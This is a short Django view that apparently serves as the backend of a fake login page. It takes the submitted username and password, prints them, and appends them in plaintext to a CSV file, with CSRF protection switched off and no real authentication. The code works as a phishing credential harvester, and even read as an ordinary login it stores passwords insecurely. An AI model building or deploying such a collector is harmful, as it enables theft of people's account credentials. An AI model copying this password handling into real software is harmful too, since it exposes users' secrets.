from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def home(request):
    if request.method == 'POST':
        username = request.POST.get('user')
        password = request.POST.get('pass')
        print(username, password)
        with open('records.csv', 'a') as file:
            file.write(f'{username},{password}\n')
        return render(request, 'login/log.html')
    return render(request, 'login/index.html')